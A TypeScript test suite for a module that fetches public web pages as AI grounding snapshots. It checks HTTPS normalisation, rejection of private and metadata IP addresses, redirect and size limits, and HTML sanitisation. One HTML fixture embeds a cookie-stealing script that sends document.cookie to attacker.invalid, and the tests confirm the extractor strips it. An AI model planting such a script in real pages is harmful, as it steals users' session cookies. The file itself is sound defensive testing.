import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { readFileSync } from "node:fs";
import test from "node:test";

import {
  extractReadableWebKnowledge,
  fetchWebKnowledgeSnapshot,
  isPublicUnicastWebAddress,
  normalizeWebKnowledgeSourceUrl,
  resolvePublicWebKnowledgeTarget,
  WEB_KNOWLEDGE_SOURCE_LIMITS,
  type WebKnowledgeResponse,
} from "../src/lib/ai/web-knowledge-source";

function apiError(message: RegExp) {
  return (error: unknown) => {
    assert.equal(
      typeof error === "object" && error !== null && "status" in error
        ? error.status
        : null,
      422,
    );
    assert.match(error instanceof Error ? error.message : "", message);
    return true;
  };
}

function response(input: {
  statusCode?: number;
  headers?: WebKnowledgeResponse["headers"];
  chunks?: Uint8Array[];
  close?: () => void;
} = {}): WebKnowledgeResponse {
  return {
    statusCode: input.statusCode ?? 200,
    headers: input.headers ?? { "content-type": "text/html; charset=utf-8" },
    body: (async function* body() {
      for (const chunk of input.chunks ?? []) yield chunk;
    })(),
    close: input.close ?? (() => undefined),
  };
}

test("web source URLs are canonical HTTPS/443 URLs without credentials", () => {
  assert.equal(
    normalizeWebKnowledgeSourceUrl(
      "https://Example.COM:443/handbook?version=2#internal",
    ).toString(),
    "https://example.com/handbook?version=2",
  );
  for (const value of [
    "http://example.com/",
    "https://user:secret@example.com/",
    "https://example.com:8443/",
    "not-a-url",
  ]) {
    assert.throws(() => normalizeWebKnowledgeSourceUrl(value), apiError(/Webquelle|Webquellen/));
  }
});

test("web source DNS resolution rejects private, reserved and mixed answers", async () => {
  for (const address of [
    "127.0.0.1",
    "10.0.0.4",
    "169.254.169.254",
    "192.0.2.10",
    "::1",
    "fc00::1",
    "2001:db8::1",
    "::ffff:127.0.0.1",
  ]) {
    assert.equal(isPublicUnicastWebAddress(address), false, address);
  }
  assert.equal(isPublicUnicastWebAddress("93.184.216.34"), true);
  assert.equal(isPublicUnicastWebAddress("2606:4700:4700::1111"), true);

  const target = await resolvePublicWebKnowledgeTarget("https://example.com/a", {
    lookup: async () => [
      { address: "93.184.216.34", family: 4 },
      { address: "2606:4700:4700::1111", family: 6 },
    ],
  });
  assert.equal(target.address, "93.184.216.34");
  assert.equal(target.family, 4);

  await assert.rejects(
    resolvePublicWebKnowledgeTarget("https://example.com/a", {
      lookup: async () => [
        { address: "93.184.216.34", family: 4 },
        { address: "127.0.0.1", family: 4 },
      ],
    }),
    apiError(/private|reservierte/),
  );
  await assert.rejects(
    resolvePublicWebKnowledgeTarget("https://127.0.0.1/"),
    apiError(/private|reservierte/),
  );
});

test("HTML snapshots keep readable text and discard executable, hidden and credential form content", () => {
  const extracted = extractReadableWebKnowledge({
    sourceUrl: "https://example.com/handbook",
    mediaType: "text/html",
    body: `<!doctype html>
      <html><head><title>Transfer &amp; Praxis</title>
      <style>.secret { display: block }</style></head>
      <body>
        <nav>Navigation secret</nav>
        <main>
          <h1>Transferwissen</h1>
          <p>Erst planen &amp; dann in der Praxis pruefen.</p>
          <p hidden>Hidden credential</p>
          <div aria-hidden="true">Invisible token</div>
          <form><label>Passwort</label><input value="top-secret" /></form>
          <script>fetch('https://attacker.invalid/?cookie=' + document.cookie)</script>
        </main>
      </body></html>`,
  });
  assert.equal(extracted.title, "Transfer & Praxis");
  assert.match(extracted.content, /Transferwissen/);
  assert.match(extracted.content, /Erst planen & dann/);
  assert.doesNotMatch(
    extracted.content,
    /Navigation secret|Hidden credential|Invisible token|Passwort|top-secret|fetch|cookie/,
  );
  assert.doesNotMatch(extracted.content, /<[^>]+>/);
});

test("snapshot fetch pins the resolved target and returns immutable digest metadata", async () => {
  const html = new TextEncoder().encode(
    "<html><head><title>Public handbook</title></head><body><main><h1>Release process</h1><p>Review, approve and publish the learning module.</p></main></body></html>",
  );
  let closed = false;
  const fetchedAt = new Date("2026-07-12T10:00:00.000Z");
  const snapshot = await fetchWebKnowledgeSnapshot(
    "https://example.com:443/handbook#section",
    {
      lookup: async (hostname) => {
        assert.equal(hostname, "example.com");
        return [{ address: "93.184.216.34", family: 4 }];
      },
      open: async (target) => {
        assert.equal(target.address, "93.184.216.34");
        assert.equal(target.url.toString(), "https://example.com/handbook");
        return response({ chunks: [html], close: () => { closed = true; } });
      },
      now: () => fetchedAt,
    },
  );
  assert.equal(closed, true);
  assert.equal(snapshot.sourceUrl, "https://example.com/handbook");
  assert.equal(snapshot.title, "Public handbook");
  assert.equal(snapshot.fetchedAt, fetchedAt);
  assert.equal(
    snapshot.contentDigest,
    createHash("sha256").update(snapshot.content, "utf8").digest("hex"),
  );
});

test("snapshot fetch rejects redirects, unsafe representations and bounded-body violations", async () => {
  const cases: Array<{
    name: string;
    value: WebKnowledgeResponse;
    message: RegExp;
  }> = [
    {
      name: "redirect",
      value: response({ statusCode: 302, headers: { location: "https://example.org/" } }),
      message: /Weiterleitungen/,
    },
    {
      name: "authentication",
      value: response({ statusCode: 401 }),
      message: /ohne Anmeldung/,
    },
    {
      name: "content type",
      value: response({ headers: { "content-type": "application/pdf" } }),
      message: /HTML oder Klartext/,
    },
    {
      name: "encoding",
      value: response({
        headers: {
          "content-type": "text/html; charset=utf-8",
          "content-encoding": "gzip",
        },
      }),
      message: /Komprimierte/,
    },
    {
      name: "declared size",
      value: response({
        headers: {
          "content-type": "text/plain",
          "content-length": String(
            WEB_KNOWLEDGE_SOURCE_LIMITS.maxResponseBytes + 1,
          ),
        },
      }),
      message: /Groessenlimit/,
    },
    {
      name: "streamed size",
      value: response({
        headers: { "content-type": "text/plain" },
        chunks: [
          new Uint8Array(WEB_KNOWLEDGE_SOURCE_LIMITS.maxResponseBytes),
          new Uint8Array([65]),
        ],
      }),
      message: /Groessenlimit/,
    },
    {
      name: "invalid UTF-8",
      value: response({
        headers: { "content-type": "text/plain; charset=utf-8" },
        chunks: [new Uint8Array([0xc3, 0x28])],
      }),
      message: /UTF-8/,
    },
  ];
  for (const fixture of cases) {
    let closed = false;
    await assert.rejects(
      fetchWebKnowledgeSnapshot("https://example.com/", {
        lookup: async () => [{ address: "93.184.216.34", family: 4 }],
        open: async () => ({ ...fixture.value, close: () => { closed = true; } }),
      }),
      apiError(fixture.message),
      fixture.name,
    );
    assert.equal(closed, true, fixture.name);
  }
});

test("publish and chat grounding read stored snapshots without web egress", () => {
  const transport = readFileSync(
    new URL("../src/lib/ai/web-knowledge-source.ts", import.meta.url),
    "utf8",
  );
  assert.match(transport, /agent: false/);
  assert.match(transport, /family: target\.family/);
  assert.match(transport, /callback\(null, target\.address, target\.family\)/);
  assert.doesNotMatch(transport, /\b(?:Cookie|Authorization)\s*:/);

  const studio = readFileSync(
    new URL("../src/lib/ai/agent-studio.ts", import.meta.url),
    "utf8",
  );
  const publish = studio.slice(
    studio.indexOf("export async function publishAiAgentDraft"),
    studio.indexOf("export async function rollbackAiAgentVersion"),
  );
  assert.match(publish, /storedWebSnapshots\(configuration\.sourceRows\)/);
  assert.doesNotMatch(publish, /fetchWebKnowledgeSnapshot\(/);

  const conversations = readFileSync(
    new URL("../src/lib/ai/conversations.ts", import.meta.url),
    "utf8",
  );
  assert.match(conversations, /sourceType: aiAgentVersionSources\.sourceType/);
  assert.match(conversations, /"Gespeicherter Web-Snapshot"/);
  assert.doesNotMatch(
    conversations,
    /web-knowledge-source|httpsRequest|fetchWebKnowledgeSnapshot/,
  );
});
